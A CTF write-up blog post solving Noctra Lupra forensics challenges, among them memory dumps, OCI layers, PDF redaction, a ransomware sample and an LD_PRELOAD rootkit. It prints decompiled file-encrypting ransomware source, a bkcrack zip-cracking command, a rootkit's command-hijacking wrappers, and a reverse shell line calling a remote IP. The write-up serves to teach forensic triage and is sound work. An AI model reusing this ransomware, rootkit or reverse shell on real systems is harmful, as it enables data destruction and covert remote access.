---
title: "NCLP CTF — Season 1"
description: "Complete write-ups of challenge that I solved in CTF Competition held by Noctra Lupra Community under ID-Networkers."
pubDate: "Oct 05 2025"
heroImage: "/images/nclp/BANNER.png"
---

Complete write-ups of challenge that I solved in CTF Competition held by Noctra Lupra Community under ID-Networkers. I finished at the top of leaderboard, earning 21,419 points with over 50 challenges solved, and to have received a specialist role for achieving the most solves in Digital Forensics, Reverse Engineering, and OSINT.

![](/images/nclp/score.png)
![](/images/nclp/image.png)

## a bit plan - Forensic

### Description
I dare you can't find my flag

### Solution
From the chall title, it references to steganography technique bit plane.

![Stego Image](/images/nclp/a_bit_plan/image.png)

With tools from (https://georgeom.net/StegOnline/upload), we can explore the bit plane of the image.

![Bit Plane Analysis](/images/nclp/a_bit_plan/image-1.png)

Flag found in Blue 0.

### Flag
NCLPS1{b4g41mAna_mungk1n_k4mu_m3nemuk4n_ku?_ ed137c932e}

## chunking - Forensic

### Description
Pada 23–24 Agustus 2025 (WIB), tim security melihat lonjakan ke endpoint internal melewati reverse proxy produksi. Permintaan berasal dari beberapa ASN cloud dan residential. Tidak ada anomali mencolok di status HTTP (umumnya 200/204), tetapi metrik request length meningkat, sementara upstream response time tetap rendah. Dugaan awal adalah beaconing

### Solution
Starting with opening the log file and found `rb64` field. From the rb64 field, we can collect all of rb64's values with this code.
```python
import sys, json, argparse

def iter_rb64(paths):
    for p in paths:
        try:
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        o = json.loads(line)
                    except Exception:
                        continue
                    rb64 = o.get("rb64")
                    if rb64:
                        yield rb64
        except Exception as e:
            print(f"[!] Gagal membuka {p}: {e}", file=sys.stderr)

def main():
    path_1 = "23.log"
    path_2 = "23.1.log"
    path_3 = "24.log"
    count_in, count_out = 0, 0
    with open("rb64_all.txt", "w", encoding="utf-8") as out:
        for rb64 in iter_rb64([path_1, path_2, path_3]):
            count_in += 1
            out.write(rb64.rstrip() + "\n")
            count_out += 1

    print(f"Saved: rb64_all.txt")

if __name__ == "__main__":
    main()
```

![alt text](/images/nclp/chunking/image.png)

From the rb64's values, It turns out that the encoding is base64 then gunzip. From the output of some decoded value, the result is just a `junk` and decoy.

![alt text](/images/nclp/chunking/image-1.png)

Upon further analysis, found rb64's length that's suspicious (`H4sIAKGQvWgC/3MLcnSPNjTXNzSPtfWrCsrydQ/KjDQKy/XNM7DlihgmgAsA/HIt5OYAAAA=`), if we decode the result is a fragment [17/17] and base64 chunk.

![alt text](/images/nclp/chunking/image-2.png)

From the fragment, we know that the difference from other payloads is the `x-campaign`. The suspicious payload has `x-campaign = koi-44291a1b`. With that information, we can gather all of the fragments then decode it to retrieve the flag.

I did this with the following code:

```python
import sys, json, argparse
import base64, zlib, re

def iter_rb64_for_campaign(paths, campaign):
    for p in paths:
        try:
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        o = json.loads(line)
                    except Exception:
                        continue
                    hdr = o.get("hdr") or {}
                    if hdr.get("x-campaign") != campaign:
                        continue
                    rb64 = o.get("rb64")
                    if rb64:
                        yield rb64
        except Exception as e:
            print(f"[!] Gagal membuka {p}: {e}", file=sys.stderr)

def b64_gunzip_decode(data):
    try:
        decoded = base64.b64decode(data)
        decompressed = zlib.decompress(decoded, wbits=zlib.MAX_WBITS | 16)
        return decompressed.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"[!] Error decoding/decompressing data: {e}", file=sys.stderr)
        return None

def main():
    campaign = "koi-44291a1b"
    paths = ["23.log", "23.1.log", "24.log"]
    frags = {}
    patt = re.compile(r"FRAG\[(\d+)/\d+\]=([A-Za-z0-9+/=]+)")

    for rb64 in iter_rb64_for_campaign(paths, campaign):
        decoded = b64_gunzip_decode(rb64)
        if not decoded:
            continue
        for i, b64part in patt.findall(decoded):
            frags[int(i)] = b64part
    
    joined_b64 = ''.join(frags[i] for i in sorted(frags))
    try:
        print(base64.b64decode(joined_b64).decode('utf-8'))
    except Exception as e:
        print(f"[!] Gagal base64-decode gabungan: {e}", file=sys.stderr)

if __name__ == "__main__":
    main()
```

### Flag
NCLPS1{gz_m3rup4kAn_mUlt1m3mBer_bUk4n_P3r_cHunK_74c0dbcef2}

## Evaporated - Forensic

### Description
Someone is hiding something there, but I don't know what they are hiding

### Solution
![](/images/nclp/evaporated/image.png)

We are given evidence file named `evaporated.001`. With autopsy, we know that there is deleted file name `logo noctra lupra.png`.

![](/images/nclp/evaporated/image-1.png)

When opening the PNG file, it seems corrupt. From then, I analyzed it with hexeditor to check the hex signature of this file. A valid PNG file always starts with 8 bytes signature containing `89 50 4E 47 0D 0A 1A 0A`. But, in this file, it doesn't start like that, so I fixed it.

![](/images/nclp/evaporated/image-2.png)
![](/images/nclp/evaporated/fix.png)

After recovering the PNG, I checked the typical steganography techniques. But it doesn't return anything valuable. 
I have an assumption that there is a mismatch on the size (width x height) of this PNG.

![](/images/nclp/evaporated/image-3.png)

In PNG file, width and height are saved in **IHDR** chunk. So, I changed the value of the **height** so the viewer can render it.

![](/images/nclp/evaporated/image-4.png)

After I changed it, the flag appears in the bottom of the file.

### Flag
NCLPS1{t4k_kus4ngkA_t3rny4Ta_fl4gny4_b3rsembuny1_09217b9c25}

## Forgotten Fragments - Forensic

### Description
Forgotten fragments of the screen still linger in the client's memory.

### Solution
```bash
xxd -g 1 -l 64 Cache0000.bin
```

I identified the given file with hexdump and it turns out that the first byte structure is RDP cache.

![alt text](/images/nclp/forgotten_frag/image.png)

To extract it, I use [bmc-tools](https://github.com/ANSSI-FR/bmc-tools).

```bash
python3 bmc-tools.py -s Cache0000.bin -b -d ./out
```

![alt text](/images/nclp/forgotten_frag/image-1.png)

After that, in /out we can see the result and the collage named **`_collage.bmp`**. Zoom in on the clearest tiles to get the flag.

### Flag
NCLPS1{in1_ng4p4in_bAngG,_bElaJar_Ya_b4ng?_9c84ea66ff}

## From Outer Space - Forensic

### Description
Sinyal misterius

### Solution
![alt text](/images/nclp/outer_space/image-1.png)

I checked what the given file actually is and it turns out that's a RIFF audio file.

![alt text](/images/nclp/outer_space/image.png)

One of the typical audio steganography techniques is using SSTV, so I tried to decode it with [SSTV Decoder](https://sstv-decoder.mathieurenaud.fr/) and I could retrieve the flag.

### Flag
NCLPS1{m44f_ya_b3r1sik_t3lin94_am4n_kan?}

## Incident Trace - Forensic

### Description
Sebuah mesin memperlihatkan aktivitas tak biasa, diduga terinfeksi binary berbahaya. Timmu berhasil memperoleh memory dump dari mesin tersebut. Periksa lebih dalam untuk menemukan artefak penting yang tersembunyi ataupun mencurigakan.

Note: Flag has 2 parts

### Solution
We're given `*.lime` file (Linux memory extractor). For the further analysis, I'm using volatility 3 to extract the dump of process and memory.

![alt text](/images/nclp/incident_trace/image.png)
![alt text](/images/nclp/incident_trace/image-1.png)

```bash
vol -f incident_trace.lime linux.psaux.PsAux
```

From the output of the command, I found two suspicious process, flagd (pid 1056) and c2_beacon (pid 597).

```yara
rule flag {
  strings:
    $a = /NCLPS1\{[^\}]{0,256}/ ascii wide
  condition:
    $a
}
```

I made a yara file and set the rule to do flag scanning with flag format, so i can retrieve the flag more easily.

```bash
vol -f incident_trace.lime linux.vmayarascan.VmaYaraScan --pid "1056" --yara-file flag.yar
vol -f incident_trace.lime linux.vmayarascan.VmaYaraScan --pid "597" --yara-file flag.yar
```

With plugin linux.vmayarascan.VmaYaraScan and yara rule, I targeted the suspicious processes before.

![alt text](/images/nclp/incident_trace/image-2.png)

From the result, I got the partA of the flag in pid 1056, but the pid 597 doesn't returns anything.

```yara
rule all_strings {
  strings:
    $s = /[ -~]{6,}/ ascii wide
  condition:
    $s
}
```
```bash
vol -f incident_trace.lime linux.vmayarascan.VmaYaraScan --pid "597" --yara-file flag.yar
```

Further scanning, I dump all of strings from pid 597 with yara rule.

![alt text](/images/nclp/incident_trace/image-3.png)

PartB found in the response body of the c2, assamble it to get the correct flag.

### Flag
NCLPS1{w00owWwW_k4mu_men3muK4n_fLa9_d1_h34p_seLanjuTNy4_d1_n3TwoRk_vla_C2_buff3r_2fafe5711d}

## Layers - Forensic

### Description
Sebuah layanan internal (web static di reverse Nginx dengan backend di /api) sempat dibuild dan didistribusikan. Setelah itu, salah satu developer mengakui pernah memasukkan sebuah berkas teks berisi token internal ke dalam layanan tersebut, lalu diubah isinya beberapa waktu kemudian, dan akhirnya dihapus pada build berikutnya. Untuk keperluan audit & rotasi kredensial, tim diminta memastikan apakah artefak token itu masih tersisa, dan bila masih ada mengambil nilai token tersebut.

### Solution
Given `layers.tar` and after extracting the file, it turns out that's an OCI image layout. First step is to convert the OCI-Layout to docker-archive so I can do the analysis more easily.

```bash
skopeo copy oci-archive:layers.tar docker-archive:layers-docker.tar:nclp/layers:latest
```
`skopeo copy` helps for turning OCI layout to docker-archive that can support `dive` and I can do the inspection of the metadata image (manifest/config) without running the container. After that, I opened the `docker-archive` with `dive` to see the registered layer, command history, and the content of layer interactively.

```bash
dive docker-archive://layers-docker.tar
```

![alt text](/images/nclp/layers/image.png)

With `dive`, I analyzed layers that contain some suspicious instructions. There is a `COPY flag.txt /root/flag.txt` instruction. Upon analyzing this, I can get the layer ID `da43bac397f47302e4e2ad61c7ab22da577ef41d77c194a8fab68a2e6cb42499` of the instruction. The next step is to extract the tar file based on the layer ID, then read the flag.txt.

```bash
tar xvf layers-docker.tar
```

![alt text](/images/nclp/layers/image-1.png)

### Reference
https://05t3.github.io/posts/Urchinsec-CTF/

### Flag
NCLPS1{d33p_l4yer5_pRes3rVe_t1meLinE_M0re_th4n_y0u_th1nk_822644845a}

## Redaction Fail - Forensic

### Description
Divisi compliance menyerahkan sebuah dokumen final yang telah dirilis ke pihak eksternal. Dokumen tersebut memuat blok hitam menutupi sebuah informasi sensitif. Ada dugaan bahwa proses "redaksi" tidak dilakukan dengan benar.

### Solution
I started with opening the PDF file and seeing the parts that got censored. But most of all, it's just a decoy. The next step is to analyze the PDF structures with strings.

![alt text](/images/nclp/redaction/image.png)

I found suspicious things at the 7th object. That object contains properties with `ASCII85Decode`, `FlateDecode` and some random encoding. This indicates that the data got encoded with ASCII85 then compressed with zlib/deflate. I decoded the data with this script:

```python
import base64
import zlib

data = r'''GatU0gMY_1&:N^lk,CtI5eOh#2k$OWPa!<Cp*l.^_$b)G?)(t*8uqr<a5@Xj%;hgHamt.,R56YB^nDk)?De.g4bp?S%%%EM#0cQ3^i/.oGC#)No8\RHL"MH4ELau*#7S6VN.BSQa.^gT@"/OoHZ9.bpT2c!#p0@54BHJYi\7H7W%Anj/ok55j]ii/IfOrG?sbb_N71SrSASPpJ?'j.*"N9502OZ5.ec`5\i@01DHNpeoP:J0laXd!P;mR6@D>`)J_fB)R\QJ#Z06fR_aH&X;"qgl:%U2,Xj5Q?IpLu)c=B[Ont<*=)@PcG(`2fO>9jpTA()C;gCYh>>]9XE^uR@E&jm@'m/S^*V+3iY,P)YEL+bl+V)_XK'X@ZF+pqL>Ib)s@iEB4!6dkGE#i0$%j"T>*c,5?B05CHje8pM2335EZ_L*Y<]e'AQ7[?MI>X:iO+#&&;JsYO42`-r6G?Du[g.Ig@'\7/g=<Lki[3Um'P=l(3.[0R-TRS,->"uN$rZD&NR'_HWGK3Ef?pe'_-<J&b&!_f?gFB+Ib`mKXEq>aJ_PkufQag`OA3C3@3C`'r;k?encni(oVA1\Mh0>O.!qca:AbjZ8_]X65GVF"\BQ+qMEL?(f5o9WoBp_FA@A'id#^8eVo:+-\ICE[e2nm7Q<qu8CA#]"LCa'mjIe1Qj.Ygs_I1huYO]J5.6S;9uBst*@<MQ'8o2spq_Y\=sI+Y@SlM!;M8SRnWU<G,61t=%kapdm=mS)KtS5r`Z/mq7LQpX`El+QJ7,?Ze1<W#r;73UimjCsO*4WOOHX`rZ>mU![%N:$BF7`*5C;$u3*E[K`tP(aT+\GRhRQ'H+c\$MKmMY9UBSY&f5[0Z~>'''

decoded_a85 = base64.a85decode(data, adobe=True)

try:
    result = zlib.decompress(decoded_a85)
except zlib.error:
    result = zlib.decompress(decoded_a85, -15)

print(result.decode("utf-8", errors="replace"))
```

### Flag
NCLPS1{teRny4ta_fl4g_d1_r3v1Si0n_z3Ro_iNcr3MenTal_uPddaTe_m3n1pu_m4ta_0dd31503e3}

## Reward Runner - Forensic

### Description
Rani baru saja mendapatkan email aneh. Pada email tersebut Rani diberikan file "rewardrunner.exe". Saat dijalankan Rani kehilangan pesan penting-nya. Tolong Rani membalikkan pesan penting tersebut.

### Solution
![alt text](/images/nclp/reward_runner/image.png)
![alt text](/images/nclp/reward_runner/image-1.png)

Firstly, I opened the email and checked the message. In the email there is a base64 string, so I decoded it and it turns out that's a zip file.

![alt text](/images/nclp/reward_runner/image-2.png)

I tried to extract the file, but it needs a password. In the email, there is a pastebin link that refers to *known plaintext attack*.

![alt text](/images/nclp/reward_runner/image-3.png)

Viewing with file explorer, I see a `.git` directory included with `HEAD` file in it. This can be a source to do the known plaintext attack for the encrypted zip file since the `HEAD` file is predictable.

```bash
bkcrack -C out.zip -c ".git/HEAD" -p HEAD
```

I'm using `bkcrack` to do the attack with the command above. The command tells `bkcrack` to get the ciphertext from `rewardrunner.zip` and point it to a suitable known file to retrieve the key of the zip file.

![alt text](/images/nclp/reward_runner/image-4.png)

`bkcrack` then counts the encryption key for all of the archive and we can extract the files in it with the key.

![alt text](/images/nclp/reward_runner/image-5.png)

Next step, with the found key, we can decrypt the zip file with command above and the output is `rewardrunner.exe`.

![alt text](/images/nclp/reward_runner/image-6.png)

Upon analysis to the `rewardrunner.exe` it seems this is a compiled file from .NET. I then decompiled it with [ILSpy](https://github.com/icsharpcode/ILSpy) to seek the encryption algorithm and the main code.

```csharp
// rewardrunner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// RewardRunner.Program
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

internal class Program
{
	private static readonly byte[] AesKey = Encoding.UTF8.GetBytes("id-networkersnlc");

	private static readonly byte[] XorKey = Encoding.UTF8.GetBytes("notcra_lupra");

	private static byte[] xorstep(byte[] data, byte[] xorKey)
	{
		byte[] array = new byte[data.Length];
		for (int i = 0; i < data.Length; i++)
		{
			array[i] = (byte)(data[i] ^ xorKey[i % xorKey.Length]);
		}
		return array;
	}

	private static void Main(string[] args)
	{
		string currentDirectory = Directory.GetCurrentDirectory();
		string[] files = Directory.GetFiles(currentDirectory);
		string[] array = new string[5] { ".exe", ".dll", ".pdb", ".idn.enc", "LICENSE" };
		Console.WriteLine("Encrypting files in: " + currentDirectory);
		string[] array2 = files;
		foreach (string text in array2)
		{
			string fileName = Path.GetFileName(text);
			bool flag = false;
			string[] array3 = array;
			foreach (string value in array3)
			{
				if (fileName.EndsWith(value, StringComparison.OrdinalIgnoreCase))
				{
					flag = true;
					break;
				}
			}
			if (flag)
			{
				Console.WriteLine("Skipping: " + fileName);
				continue;
			}
			try
			{
				byte[] data = File.ReadAllBytes(text);
				Console.WriteLine("Encrypting: " + fileName);
				byte[] array4 = xorstep(data, XorKey);
				using (Aes aes = Aes.Create())
				{
					aes.Key = AesKey;
					aes.Mode = CipherMode.CBC;
					aes.Padding = PaddingMode.PKCS7;
					aes.GenerateIV();
					byte[] iV = aes.IV;
					using ICryptoTransform cryptoTransform = aes.CreateEncryptor(aes.Key, aes.IV);
					byte[] array5 = cryptoTransform.TransformFinalBlock(array4, 0, array4.Length);
					byte[] array6 = new byte[iV.Length + array5.Length];
					Buffer.BlockCopy(iV, 0, array6, 0, iV.Length);
					Buffer.BlockCopy(array5, 0, array6, iV.Length, array5.Length);
					File.WriteAllBytes(text + ".idn.enc", array6);
				}
				File.Delete(text);
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error encrypting " + fileName + ": " + ex.Message);
			}
		}
		Console.WriteLine("Encryption complete.");
	}
}
```

The main function tells a clear algorithm, file got XOR-ed with `notcra_lupra` key then encrypted with AES-CBC using `id-networkersnlc` key and random IV.

For the decryption we can reverse this with: reads IV, AES-CBC decrypt, remove PKCS#7 padding, then XOR with the XOR key. I do it with this script:

```python
from Crypto.Cipher import AES

key = b"id-networkersnlc"
xor_key = b"notcra_lupra"

data = open("secret.txt.idn.enc","rb").read()
iv, ct = data[:16], data[16:]

# AES-CBC decrypt
pt_xored = AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)

# PKCS7 unpad
pad = pt_xored[-1]
pt_xored = pt_xored[:-pad]

# reverse XOR
pt = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(pt_xored))

print(pt)
```

Running the script to the `secret.txt.idn.enc` that we extracted earlier we can decrypt it and got the flag.txt file.

![alt text](/images/nclp/reward_runner/image-7.png)

### Flag
NCLPS1{d0nt_be_l1ke_Rani,_y0OoOu_h4ve_t0_be_aw4r3_of_y0urr_3nv1ronm3nt_eef53df1e1}

## Secret Signal - Forensic

### Description
Fenomena aneh terjadi: sebuah media penyimpanan yang tampaknya memiliki kapasitas tak terbatas. Namun, keajaiban ini hanyalah ilusi—ada sesuatu yang tersembunyi di balik 'glitch' tersebut. Setiap lapisan data seakan menutupi lapisan berikutnya, membuat isi sebenarnya sulit dikenali. Petunjuknya ada pada struktur file yang tidak biasa, seakan ada celah di antara byte yang bisa dimanfaatkan. Bisakah kamu menemukan rahasia yang tersembunyi di balik anomali penyimpanan tak berujung ini?
URL: https://www.youtube.com/watch?v=g8vDg94BA3U

### Solution
From the chall description, it refers to **Infinite Storage Glitch (ISG)** that exploit media file (video) as a hidden storage. 

```bash
yt-dlp -F https://www.youtube.com/watch?v=g8vDg94BA3U
```
![alt text](/images/nclp/secret_signal/image.png)

Firstly, check the Youtube video resolution format with `yt-dlp` using the command above.

```bash
yt-dlp -f 137 https://www.youtube.com/watch?v=g8vDg94BA3U
```
![alt text](/images/nclp/secret_signal/image-1.png)

From the format list, I found that the video has **1080p** resolution in format ID `137`, then downloaded the video with that resolution.

![alt text](/images/nclp/secret_signal/image-2.png)

Next step is extracting the ISG with tools that available in GitHub: [Infinite\_Storage\_Glitch](https://github.com/KKarmugil/Infinite_Storage_Glitch).

![alt text](/images/nclp/secret_signal/image-3.png)

The output is `reverse.mkv`, I checked it with file command, and it turns out that's a **ZIP file**.

```bash
mv output.mkv secret.zip
unzip secret.zip
```

I extracted that file and from the output there's an image with the flag in it.

![](/images/nclp/secret_signal/3.png)

### Flag
NCLPS1{k1ta_bisA_menyimPAn_fiLe_t4npa_b4tas_d1_yOutub3_f9c3d7cd98}

## the yuesbi - Forensic

### Description
harusnya kamu sudah tau ini apa? menarik bukan?

### Solution
![alt text](/images/nclp/the_yuesbi/image.png)

Given a pcap file, and I opened it with Wireshark. Upon analyzing the packets, it seems that this file is enumeration of USB device (GET_DESCRIPTOR, SET_CONFIGURATION) and indicates **HID Keyboard**.

![alt text](/images/nclp/the_yuesbi/image-1.png)

I'm using tools from (https://usb.org/sites/default/files/hut1_5.pdf) to detect all captured packets from the keyboard through HID data and decode it automatically. The output shows the flag.

### Flag

NCLPS1{t1d4k_H4nYya_n3twOrk_y4ng_4da_traffFf1c_USBb_juug4_ad4_tr4ff1cny4_7938ae8d3c}

## traficc - Forensic

### Description
Aku baru saja kehilangan pesan pentingku. Tampaknya ada sesuatu yang aneh pada jaringanku. Bantu aku mencarinya.

### Solution
![alt text](/images/nclp/traficc/image.png)

Given two files for this chall, pcapng and .dd. For the first analysis, I did strings command for both of the files then piped it to grep the flag format (`NCLPS1{`), and somehow it gives the flag lol. (I know it's unintended but that's how you recon all artifacts that are given by the chall hehe).

### Flag
NCLPS1{h0w_yOu_g0t_m3_4re_you_t1r3d_t0_f1nd_m3?_fd4ea173b1}

## Whisper From The Basement - Forensic

### Description
Sebuah komputer berperilaku aneh dan langsung diisolasi dari jaringan. Kamu diberi akses ke klon terkarantina dari mesin tersebut. Akses keluar (egress) ke internet diblokir, jadi segala upaya "call home" akan gagal.

Tugasmu adalah triage DFIR: cari tahu apa yang mengompromikan, bagaimana ia bertahan/bersembunyi, dan pulihkan 2 pesan yang berusaha disamarkan oleh pelaku.

**Hint:** "Hook yang baik sering bersembunyi di tempat yang selalu dibaca loader dinamis. Satu file di /etc bisa membuat direktori 'terlihat normal' padahal tidak."

### Solution
From the hint, it refers to the path that always touched by dynamic loader, which `/etc/ld.so.preload`. In that file there is a custom library.

**Filesystem & loader.**

```bash
cat /etc/ld.so.preload
# -> /usr/lib/libloadkit.so

# Avoid hook effect
LD_PRELOAD= /bin/ls -al /etc
```

**Command Hijacking**

```bash
head -n 2 /usr/bin/ls /bin/ls /usr/bin/ps /usr/bin/find /usr/bin/strings
#!/bin/bash
/usr/bin/ls.idn "$@" | grep -vE "Nnc1pl04dkit|sshdd|kit-update"
/usr/bin/ps.idn "$@" | grep -vE "sshdd|kit-update"
/usr/bin/find.idn "$@" 2>/dev/null | grep -vE "Nnc1pl04dkit|sshdd|kit-update"
/usr/bin/strings.idn "$@" | grep -vE "NCLPS1"

# using .idn binary to do actual straight analysis
/usr/bin/strings.idn -n 4 /root/quarantine/libloadkit.so | grep -i 'NCLP\|NCLPS1\|idn\|loadkit'
```

**Systemd & cron.**

```bash
systemctl list-unit-files --state=enabled | grep -i nnc1pl
LD_PRELOAD= systemctl cat Nnc1pl04dkit-monitor.service
# ExecStart=/usr/local/bin/Nnc1pl04dkit_monitor.sh

cat /usr/local/bin/Nnc1pl04dkit_monitor.sh
# EXPECTED="/usr/lib/libloadkit.so"; echo ke /etc/ld.so.preload every run

cat /etc/cron.d/kit-update
# * * * * * root /usr/local/bin/Nnc1pl04dkit_monitor.sh
```

**Reverse shell.**

```bash
LD_PRELOAD= systemctl cat sshdd.service
# ExecStart=/usr/local/sbin/sshdd
LD_PRELOAD= journalctl -u sshdd --no-pager | tail -n 40
# bash -i >& /dev/tcp/47.84.89.245/31102 0>&1 (egress blocked)

# key and others indicatord in .rodata
LD_PRELOAD= readelf -p .rodata /root/quarantine/sshdd
# ... "/bin/bash", "n0ctraLUPRa2025", "/dev/tcp/47.84.89.245/31102"
LD_PRELOAD= readelf -p .rodata /root/quarantine/libloadkit.so
# ... "readdir", "Nnc1pl04dkit", "sshdd", "ld.so.preload", "kit-update", "NCLPS1", ".idn"
```

Main compromise is **rootkit based LD_PRELOAD** that hooks `readdir` to hide some files/directories. Double persistence found: **systemd timer** that rewrites `/etc/ld.so.preload` every 30 seconds, and **cron** every minute runs the same recovery preload script. I found a fake service, `sshd.service`, which is a reverse shell to `47.84.89.245:31102`. The solution is cutting the persistence, deactivating preload when doing acquisition, then recovering the two messages.

**Cutting persistence & Deactivate the hook.**

```bash
LD_PRELOAD= systemctl stop Nnc1pl04dkit-monitor.timer sshdd.service
LD_PRELOAD= systemctl disable Nnc1pl04dkit-monitor.timer sshdd.service
LD_PRELOAD= systemctl daemon-reload

# freezing preload & moving the artifacts
mkdir -p /root/quarantine
mv /usr/lib/libloadkit.so /root/quarantine/ 2>/dev/null || true
cp /etc/ld.so.preload /root/quarantine/ld.so.preload.bak 2>/dev/null || true
: > /etc/ld.so.preload
```

**Message #1 (key XOR).**

```bash
LD_PRELOAD= readelf -p .rodata /root/quarantine/sshdd
# "/bin/bash", "n0ctraLUPRa2025", "/dev/tcp/47.84.89.245/31102"
```

**Recovering Message #2 (flag) from the hidden part + ciphertext XOR.**
First part:

```bash
/usr/bin/ls.idn -al /var/.Nnc1pl04dkit
cat /var/.Nnc1pl04dkit/part1.txt
# NCLPS1{y1haa_th3_r00k1t_hav3e3e3_aa_l
```

Carve ciphertext from `.data` `sshdd`, throw padding NUL in the front, then XOR with the key. Brute-force every possible shift. For the implementation is in this script:

```bash
PART1="/var/.Nnc1pl04dkit/part1.txt"
BIN="/root/quarantine/sshdd"
KEY="n0ctraLUPRa2025"

# test some of offset in .data; 0x3010/0x3020 contains payload
for OFF in 0x3000 0x3010 0x3020 0x3030 0x3040; do
  dd if="$BIN" of=/tmp/ct.enc bs=1 skip=$((OFF)) count=$((0x100)) status=none 2>/dev/null || continue
  perl -0777 -ne 'BEGIN{binmode STDIN; binmode STDOUT} s/^\x00+//; print' /tmp/ct.enc > /tmp/ct.trim

  for S in $(seq 0 $(( ${#KEY} - 1 ))); do
    K="$KEY" S="$S" perl -0777 -ne '
      BEGIN{ binmode STDIN; binmode STDOUT; $k=$ENV{K}; $kl=length $k; $off=int($ENV{S}); }
      $buf=$_; $l=length $buf;
      for (my $i=0; $i<$l; $i++){
        substr($buf,$i,1)=chr( ord(substr($buf,$i,1)) ^ ord(substr($k,($i+$off)%$kl,1)) );
      }
      print $buf;
    ' /tmp/ct.trim > /tmp/ct.dec

    FLAG=$( printf '%s%s' "$(tr -d '\n' < "$PART1")" "$(tr -d '\n' < /tmp/ct.dec)" \
      | LC_ALL=C grep -aoE 'NCLPS1\{[ -~]{0,200}\}' | head -n 1 )

    if [ -n "$FLAG" ]; then
      echo "$FLAG"
      break 2
    fi
  done
done
```

Output successfully HIT at one of offset in **offset `0x3010` shift `0`**:

```
[+] HIT offset=0x3010 shift=0 NCLPS1{y1haa_th3_r00k1t_hav3e3e3_aa_lFlag part2: 0tt_p3rs1stenc33_725775ce1c}
```

### Flag
NCLPS1{y1haa_th3_r00k1t_hav3e3e3_aa_l0tt_p3rs1stenc33_725775ce1c}
